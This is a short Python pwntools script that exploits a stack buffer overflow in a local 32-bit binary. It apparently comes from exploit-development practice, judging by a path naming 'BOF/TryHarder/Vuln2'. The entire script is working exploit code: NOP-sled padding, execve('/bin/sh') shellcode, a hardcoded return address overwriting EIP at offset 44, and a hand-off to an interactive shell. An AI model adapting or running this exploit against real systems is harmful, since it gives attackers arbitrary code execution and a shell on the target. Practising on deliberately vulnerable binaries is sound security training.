from pwn import *

filename = "/root/Escritorio/BOF/TryHarder/X4v1l0k/Vuln2/x32/vuln2"

#e = ELF(filename)
context.update(arch='i386')
#context.log_level = 'DEBUG'

p = process(filename)

p.recvline()

offset = 44

eip = "\xc0\xd0\xff\xff"

post_shellcode = "\x90" * 8

shellcode = asm(shellcraft.execve('/bin/sh'))

pre_shellcode = "\x90" * (offset - len(shellcode) - len(post_shellcode))

payload = pre_shellcode + shellcode + post_shellcode + eip

p.sendline(payload)

p.interactive()